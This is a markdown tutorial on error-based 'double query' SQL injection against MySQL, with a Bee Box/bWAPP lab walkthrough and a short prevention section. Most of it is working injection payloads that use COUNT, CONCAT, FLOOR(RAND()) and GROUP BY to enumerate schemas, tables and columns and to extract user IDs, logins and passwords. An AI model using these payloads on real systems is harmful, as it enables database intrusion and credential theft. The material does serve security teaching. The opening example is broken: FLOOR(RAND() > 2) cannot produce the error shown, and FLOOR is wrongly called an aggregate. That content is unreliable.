# 🔐 Double Query Injection (DQI)

> **Advanced SQL Injection Technique for Web Application Penetration Testing**

---

## 📋 Table of Contents

- [Overview](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#overview)
- [What is Double Query Injection](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#what-is-double-query-injection)
- [How It Works](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#how-it-works)
- [Common Building Blocks](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#common-building-blocks)
- [Difference from Standard SQL Injection](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#difference-from-standard-sql-injection)
- [Prevention Techniques](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#prevention-techniques)
- [Practical Examples - Bee Box Lab](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#practical-examples---bee-box-lab)
    - [Setup](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#setup)
    - [Basic Queries](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#basic-queries)
    - [Exploitation Techniques](https://claude.ai/chat/1c76515f-e3a8-458d-b85c-982cee05ae62#exploitation-techniques)

---

## 🎯 Overview

**Double Query Injection (DQI)** is an advanced form of SQL Injection (SQLi) that exploits database subqueries and aggregate functions to extract data or generate database errors revealing hidden information. It leverages multi-level query structures to trick the database engine into exposing results not otherwise accessible via standard SQLi methods.

### Key Characteristics

- **Query Depth**: Multi-level (nested queries)
- **Output Type**: Error-based, indirect data leakage
- **Techniques**: Aggregation + Subquery exploitation
- **Detection Complexity**: Harder to detect and sanitize

---

## 🔍 What is Double Query Injection

Double Query Injection involves **embedding one SQL query inside another** — a subquery wrapped in a parent query. The outer query processes the result of the inner query, potentially triggering an identifiable error message or conditional logic failure if crafted precisely.

### Core Concept

- **Inner Query**: Retrieves unauthorized data
- **Outer Query**: Manipulates or exposes this data through concatenation, aggregation, or grouping operations

In essence, unlike typical SQLi that inserts malicious input directly into an SQL statement, DQI operates through **two query layers**. The inner query retrieves unauthorized data, while the outer query manipulates or exposes this data through concatenation, aggregation, or grouping operations.

---

## ⚙️ How It Works

### Requirements

**MySQL Version**: ≥ 5.7.29

### Simplified Example

```sql
SELECT COUNT(*), 
       CONCAT((SELECT database()), 
              FLOOR(RAND() > 2)) AS a
FROM information_schema.tables
GROUP BY a;
```

### Execution Result

When executed, the query can yield a duplication error such as:

```
ERROR 1062 (23000): Duplicate entry 'security1' for key 'group_key'
```

> 💡 **Note**: This error message unintentionally reveals information — in this case, the current database name **"security"** — demonstrating how DQI leverages SQL's internal error handling to extract information.

---

## 🧱 Common Building Blocks

Double Query Injection commonly employs these SQL components:

### 1. **Subqueries**

Queries nested within another query, evaluated first.

```sql
(SELECT database())
(SELECT table_name FROM information_schema.tables LIMIT 0,1)
```

### 2. **Aggregate Functions**

Such as `COUNT()` or `FLOOR()`, used to generate meaningful error responses.

```sql
COUNT(*)
FLOOR(RAND() * 8)
```

### 3. **Group By Clause**

Used to provoke unique or duplicated entries that lead to runtime database errors.

```sql
GROUP BY a
```

---

## 📊 Difference from Standard SQL Injection

|Feature|Standard SQL Injection|Double Query Injection|
|---|---|---|
|**Query depth**|Single-level|Multi-level (nested queries)|
|**Output type**|Direct data extraction|Error-based, indirect data leakage|
|**Techniques**|UNION, OR '1'='1', etc.|Aggregation + Subquery exploitation|
|**Detection complexity**|Easier to detect|Harder to detect and sanitize|

---

## 🛡️ Prevention Techniques

To protect against Double Query Injection and other SQLi forms:

### 1. **Use Parameterized Queries or Prepared Statements**

Separate code from data to prevent malicious input execution.

```python
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

### 2. **Implement Strict Input Validation and Whitelisting**

Accept only known-good values.

```python
import re
if not re.match(r'^[a-zA-Z0-9_]+$', user_input):
    raise ValueError("Invalid input")
```

### 3. **Restrict Database Error Output**

Prevent data leaks through detailed error messages in production.

```python
# Don't expose detailed errors to users
try:
    execute_query()
except Exception:
    return "An error occurred"  # Generic message
```

### 4. **Regularly Monitor and Sanitize Database Logs**

Watch for suspicious query patterns.

### 5. **Employ Web Application Firewalls (WAFs)**

Add an extra layer of protection with SQLi awareness.

---

## 🧪 Practical Examples - Bee Box Lab

### Setup

#### Logging in via SSH

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.1.236
```

#### Starting MySQL

```bash
mysql -V
```

#### Connect to MySQL and Select Database

```bash
mysql -u root -pbug
USE mysql;
```

---

### Basic Queries

#### Show All Databases

```sql
show databases;
```

#### Create a New Database Named 'sqli_db'

```sql
CREATE DATABASE sqli_db;
```

#### Switch to Use the Newly Created Database 'sqli_db'

```sql
USE sqli_db;
```

#### Create a Table Named 'users'

```sql
CREATE TABLE users (
    id INT,                    -- User ID as an integer
    name VARCHAR(50),          -- User's name, varchar with max length 50
    email VARCHAR(50),         -- User's email, varchar with max length 50
    password VARCHAR(50),      -- User's password, varchar with max length 50
    enable INT(1)              -- Status flag indicating if user is enabled (1) or disabled (0)
);
```

#### Insert Multiple User Records into the 'users' Table

```sql
INSERT INTO users(id, name, email, password, enable)
VALUES
    (1,'krishna','krishna@armour.com','ee9rd34',1),    -- Enabled user
    (2,'admin','admin@armour.com','password123',1),     -- Enabled admin user
    (3,'ankit','ankit@armour.com','123456',1),         -- Enabled user
    (4,'rahul','rahul@armour.com','123456',1),         -- Enabled user
    (5,'pooja','pooja@armour.com','123456',1),         -- Enabled user
    (6,'Vishal','Vishal@armour.com','12343221',0);     -- Disabled user
```

---

### Exploitation Techniques

#### Check Server Version and List Databases

```sql
SELECT version();
SHOW DATABASES;
```

#### Test RAND() and Simple Arithmetic

```sql
SELECT RAND();
SELECT RAND() - 4;
SELECT RAND() - 8;
SELECT RAND() * 4;
SELECT RAND() * 8;
```

#### Using FLOOR Function

```sql
SELECT FLOOR(7.148574403625524);
SELECT FLOOR(RAND() * 8);
SELECT FLOOR(RAND() * 8) AS a;
SELECT FLOOR(RAND() * 8) AS a;
```

---

#### Count Tables/Columns and Rows in `users`

```sql
-- Count total tables
SELECT COUNT(*) FROM information_schema.tables;

-- Count total columns
SELECT COUNT(*) FROM information_schema.columns;

-- Count rows in users table
SELECT COUNT(*) FROM sqli_db.users;
```

---

#### List Tables and Schemas; Show Current Database

```sql
-- List table names
SELECT table_name FROM information_schema.tables;

-- Group tables by schema
SELECT table_schema FROM information_schema.tables GROUP BY table_schema;

-- Show current database
SELECT DATABASE();

-- Nested query to show database
SELECT (SELECT DATABASE());
```

---

#### Simple CONCAT / Hex Prefixing to Mark Results

```sql
-- Concatenate database name
SELECT CONCAT((SELECT DATABASE()));

-- Add hex delimiters
SELECT CONCAT(0x3a,0x3a, (SELECT DATABASE()), 0x3a,0x3a);

-- Add random bucket and alias
SELECT CONCAT(0x3a,0x3a, (SELECT DATABASE()), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a;
```

---

#### Use `information_schema` with RAND() to Force Multiple Rows / Infer Results

```sql
-- Force multiple rows from tables metadata
SELECT CONCAT(0x3a,0x3a, (SELECT DATABASE()), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.tables;

-- Same from columns metadata
SELECT CONCAT(0x3a,0x3a, (SELECT DATABASE()), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns;

-- Group by the concatenated random bucket
SELECT CONCAT(0x3a,0x3a, (SELECT DATABASE()), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.tables 
GROUP BY a;
```

---

#### Count + Concat for User/Version/Table Inference

```sql
-- Count grouped by database+random bucket
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT DATABASE()), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.tables 
GROUP BY a;

-- Count grouped by current user+random bucket
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT USER()), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Count grouped by version+random bucket
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT VERSION()), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;
```

### 🔍 How Each Component Works

|Part|What it does|
|---|---|
|`FROM information_schema.tables`|Uses the metadata table that lists all tables visible to the current user. Produces one row per table (so many rows).|
|`FLOOR(RAND() * 8)`|`RAND()` generates a pseudo-random float in `[0,1)`. Multiplying by `8` gives `[0,8)`. `FLOOR(...)` converts that to an integer in `{0,1,2,3,4,5,6,7}`. Evaluated per row, so each row gets a random bucket number 0–7.|
|`CONCAT(0x3a,0x3a, (SELECT DATABASE()), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a`|Builds a labeled string combining delimiters, the current database name, and a random bucket. Parts:<br>• `0x3a` — hex for `:` so `0x3a,0x3a` → `::` (clear delimiter).<br>• `(SELECT DATABASE())` — returns the current database name (e.g. `armour_db`).<br>• `FLOOR(RAND() * 8)` — random integer 0–7 appended to help split rows into buckets.<br>Example result: `::armour_db::3` (aliased as `a`).|
|`SELECT COUNT(*), ... GROUP BY a`|`COUNT(*)` counts how many source rows fall into each group defined by `a`. `GROUP BY a` groups rows by the concatenated string (which includes the random bucket), producing up to 8 groups (0..7) with each group's row count and the corresponding `a` value.|

---

#### Extract First Table Names from Current Database (by Offset)

```sql
-- Extract first table (offset 0)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT table_name FROM information_schema.tables 
WHERE table_schema = DATABASE() LIMIT 0,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Extract second table (offset 1)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT table_name FROM information_schema.tables 
WHERE table_schema = DATABASE() LIMIT 1,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Filter for 'mysql' schema, first table (offset 0)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT table_name FROM information_schema.tables 
WHERE table_schema = 'mysql' LIMIT 0,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Filter for 'mysql' schema, second table (offset 1)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT table_name FROM information_schema.tables 
WHERE table_schema = 'mysql' LIMIT 1,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Filter for 'mysql' schema, third table (offset 2)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT table_name FROM information_schema.tables 
WHERE table_schema = 'mysql' LIMIT 2,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;
```

---

#### Enumerate Columns for `users` Table

```sql
-- First column (offset 0)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT column_name FROM information_schema.columns 
WHERE table_name='users' LIMIT 0,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Second column (offset 1)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT column_name FROM information_schema.columns 
WHERE table_name='users' LIMIT 1,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;
```

---

#### Extract Data from `users`

```sql
-- Extract first user's ID (offset 0)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT id FROM users LIMIT 0,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Extract first user's name (offset 0)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT name FROM users LIMIT 0,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Extract second user's name (offset 1)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT name FROM users LIMIT 1,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;
```

---

#### bWAPP `users` Table Column Enumeration

```sql
-- First column (offset 0)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT column_name FROM information_schema.columns 
WHERE table_name='users' LIMIT 0,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Second column (offset 1)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT column_name FROM information_schema.columns 
WHERE table_name='users' LIMIT 1,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Third column (offset 2)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT column_name FROM information_schema.columns 
WHERE table_name='users' LIMIT 2,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;
```

---

#### Extract IDs, Logins and Passwords from `bWAPP.users`

```sql
-- Extract first user's ID (offset 0)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT id FROM bWAPP.users LIMIT 0,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Extract second user's ID (offset 1)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT id FROM bWAPP.users LIMIT 1,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Extract first user's login (offset 0)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT login FROM bWAPP.users LIMIT 0,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Extract second user's login (offset 1)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT login FROM bWAPP.users LIMIT 1,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Extract first user's password (offset 0)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT password FROM bWAPP.users LIMIT 0,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;

-- Extract second user's password (offset 1)
SELECT COUNT(*), CONCAT(0x3a,0x3a, (SELECT password FROM bWAPP.users LIMIT 1,1), 0x3a,0x3a, FLOOR(RAND() * 8)) AS a 
FROM information_schema.columns 
GROUP BY a;
```

---

## 📝 Summary

Double Query Injection represents a sophisticated SQL exploitation technique that chains queries together to cause specific database behavior, often through errors. Despite being an advanced attack, it can be prevented with secure coding practices, rigorous input validation, and robust query parameterization.

---

## ⚠️ Disclaimer

This documentation is intended for **educational purposes** and **authorized security testing** only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting penetration tests.

---

## 📚 References

- OWASP SQL Injection
- MySQL Documentation
- Web Application Security Testing Guides
- Bee Box Vulnerable Web Application

---

<div align="center">

**Created for Cybersecurity Education**

🔒 _Stay Safe, Test Ethically_ 🔒

</div>